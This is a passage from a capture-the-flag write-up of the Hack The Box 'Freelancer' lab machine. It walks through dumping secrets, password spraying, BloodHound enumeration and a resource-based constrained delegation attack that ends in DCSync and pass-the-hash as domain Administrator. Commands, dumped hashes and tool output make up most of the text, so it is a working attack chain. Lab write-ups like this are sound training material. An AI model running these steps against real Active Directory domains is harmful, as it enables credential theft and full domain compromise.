dpapi_machinekey:0xcf1bc407d272ade7e781f17f6f3a3fc2b82d16bc
dpapi_userkey:0x6d210ab98889fac8829a1526a5d6a2f76f8f9d53
[*] NL$KM
 0000   63 4D 9D 4C 85 EF 33 FF  A5 E1 4D E2 DC A1 20 75   cM.L..3...M... u
 0010   D2 20 EA A9 BC E0 DB 7D  BE 77 E9 BE 6E AD 47 EC   . .....}.w..n.G.
 0020   26 02 E1 F6 BF F5 C5 CC  F9 D6 7A 16 49 1C 43 C5   &.........z.I.C.
 0030   77 6D E0 A8 C6 24 15 36  BF 27 49 96 19 B9 63 20   wm...$.6.'I...c
NL$KM:634d9d4c85ef33ffa5e14de2dca12075d220eaa9bce0db7dbe77e9be6ead47ec2602e1f6bff5c5ccf9d67a16491c43c5776de0a8c6241536bf27499619b96320
[*] _SC_MSSQL$DATA
(Unknown User):PWN3D#l0rr@Armessa199
[*] Cleaning up...
```

`impacket-secretsdump` can be used to dump SAM hashes.

Get the user with this password:
```bash
└─$ netexec smb 10.10.11.5 -u usernames.txt -p 'PWN3D#l0rr@Armessa199'
SMB         10.10.11.5      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)
...
SMB         10.10.11.5      445    DC               [+] freelancer.htb\lorra199:PWN3D#l0rr@Armessa199
```

Get the reverse shell and explore system:
```bash
PS C:\WINDOWS\system32> cd $HOME
cd $HOME
PS C:\Users\lorra199> tree /f
tree /f
Folder PATH listing
Volume serial number is 8954-28AE
C:.
3D Objects
Contacts
Desktop
Documents
Downloads
       PowerView3.ps1

Favorites
Links
Music
Pictures
Saved Games
Searches
Videos
PS C:\WINDOWS\system32> whoami /priv
Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

### Winrm 

This user is able to use `winrm`, upgrade shell:
```bash
└─$ evil-winrm -i 10.10.11.5 -u 'lorra199' -p 'PWN3D#l0rr@Armessa199'
```

Sync time and get "loot" for bloodhound:
```bash
└─$ sudo ntpdate freelancer.htb
2024-06-16 15:29:24.591660 (-0400) +18000.576877 +/- 0.041795 freelancer.htb 10.10.11.5 s1 no-leap
CLOCK: time stepped by 18000.576877

└─$ faketime -f +5h bloodhound-python -u lorra199 -p "PWN3D#l0rr@Armessa199" -d freelancer.htb -ns 10.10.11.5 -c all
```

> Note: **1.** NetBIOS error shouldn't be an issue for Bloodhound. **2.** `ntpdate` didn't work, `faketime` fixed the issue.
{: .prompt-tip }

![Writeup-13.png](/assets/images/Season 5/Freelancer/Writeup-13.png)

Mark the `lorra199` user as owned.

To show all computers on network use query: `MATCH (c:Computer) RETURN c`

There seems to be second domain controller on the network.

![Writeup-14.png](/assets/images/Season 5/Freelancer/Writeup-14.png)

Show shortest path to DC2 from owned user.

![Writeup-15.png](/assets/images/Season 5/Freelancer/Writeup-15.png)

_Members of this group can list/delete/control the deleted active directory objects_
_The AD RECYLE BIN group has GenericWrite permissions on DC2 and can modify the attributes of the account, including setting or changing the list of services allowed to be delegated to, which can indirectly implement constrained delegation (RBCD)._

Deleted object can be listed using:
```powershell
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
## Privilege Escalation (Administrator)

[A Practical Guide To RBCD Exploitation](https://medium.com/@offsecdeer/a-practical-guide-to-rbcd-exploitation-a3f1a47267d5)

```bash
└─$ impacket-addcomputer -computer-name 'test02$' -dc-ip 10.10.11.5 freelancer.htb/lorra199:'PWN3D#l0rr@Armessa199'
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Successfully added machine account test02$ with password Hye7CZPcPzoHsIr6jtiWnR2eKdrX0lFb.

└─$ impacket-rbcd -delegate-to 'DC$' -delegate-from 'test02$' -dc-ip 10.10.11.5 -action write freelancer.htb/lorra199:'PWN3D#l0rr@Armessa199'
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Accounts allowed to act on behalf of other identity:
[*]     ATTACKERSYSTEM$   (S-1-5-21-3542429192-2036945976-3483670807-11601)
[*] Delegation rights modified successfully!
[*] test02$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     ATTACKERSYSTEM$   (S-1-5-21-3542429192-2036945976-3483670807-11601)
[*]     test02$      (S-1-5-21-3542429192-2036945976-3483670807-11602)

└─$ impacket-getST -spn cifs/dc.freelancer.htb -impersonate Administrator -dc-ip 10.10.11.5 'freelancer.htb/test02$:Hye7CZPcPzoHsIr6jtiWnR2eKdrX0lFb'
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)

└─$ faketime -f +5h impacket-getST -spn cifs/dc.freelancer.htb -impersonate Administrator -dc-ip 10.10.11.5 'freelancer.htb/test02$:Hye7CZPcPzoHsIr6jtiWnR2eKdrX0lFb'
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_dc.freelancer.htb@FREELANCER.HTB.ccache

└─$ export KRB5CCNAME=Administrator@cifs_dc.freelancer.htb@FREELANCER.HTB.ccache

└─$ impacket-psexec -k -no-pass freelancer.htb/administrator@dc.freelancer.htb # Didn't work

└─$ faketime -f +5h impacket-secretsdump -k -no-pass freelancer.htb/Administrator@dc.freelancer.htb -just-dc-user Administrator
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0039318f1e8274633445bce32ad1a290:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:1743fa93ed1f2f505d3c7cd6ef1e8c40589f107070065e98efc89ea907d81601
Administrator:aes128-cts-hmac-sha1-96:bd23b1924f1fd0bdc60abf464114a867
Administrator:des-cbc-md5:0d400dfe572a3262
[*] Cleaning up...

└─$ evil-winrm -i 10.10.11.5 -u 'Administrator' -H 0039318f1e8274633445bce32ad1a290

Evil-WinRM shell v3.5

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
freelancer\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../Desktop/root.txt
50e6b10c0abbad922aaba002e2a8366f
```

---

References:
- [https://medium.com/@offsecdeer/a-practical-guide-to-rbcd-exploitation-a3f1a47267d5](https://medium.com/@offsecdeer/a-practical-guide-to-rbcd-exploitation-a3f1a47267d5)

Writeups:
- [https://blog.csdn.net/m0_52742680/article/details/139441094](https://blog.csdn.net/m0_52742680/article/details/139441094)
- [https://cn-sec.com/archives/2814147.html](https://cn-sec.com/archives/2814147.html)

Should read:
- Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)

Should give a read?:
- Exploit samAccountName spoofing with Kerberos [https://cloudbrothers.info/en/exploit-kerberos-samaccountname-spoofing](https://cloudbrothers.info/en/exploit-kerberos-samaccountname-spoofing)
